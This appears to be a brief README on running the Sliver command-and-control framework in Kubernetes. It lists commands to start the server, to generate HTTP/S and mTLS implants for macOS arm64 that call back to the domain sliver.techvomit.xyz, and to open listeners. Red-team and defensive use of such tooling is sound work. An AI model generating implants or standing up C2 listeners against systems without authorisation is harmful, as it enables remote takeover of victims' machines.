# Sliver C2

Sliver is a general-purpose cross-platform implant framework that supports C2
over Mutual-TLS (mTLS), HTTP(S), and DNS.

## Using Sliver C2 in Kubernetes

1. **Start the Sliver Server:**

   ```bash
   kubectl exec -it deployments/sliver -- /opt/sliver-server
   ```

1. **Create an Implant:**

   HTTP/S implant for macOS arm64 device:

   ```bash
   generate --http sliver.techvomit.xyz --save /home/sliver/.sliver/implants/sliver-init --skip-symbols --os macos --arch arm64
   ```

   mTLS implant for macOS arm64 device:

   ```bash
   generate --mtls sliver.techvomit.xyz --save /home/sliver/.sliver/implants/sliver-mtls --skip-symbols --os macos --arch arm64
   ```

1. **Create a Listener:**

   HTTP listener:

   ```bash
   http
   ```

   HTTPS listener:

   ```bash
   https
   ```

   mTLS listener:

   ```bash
   mtls
   ```
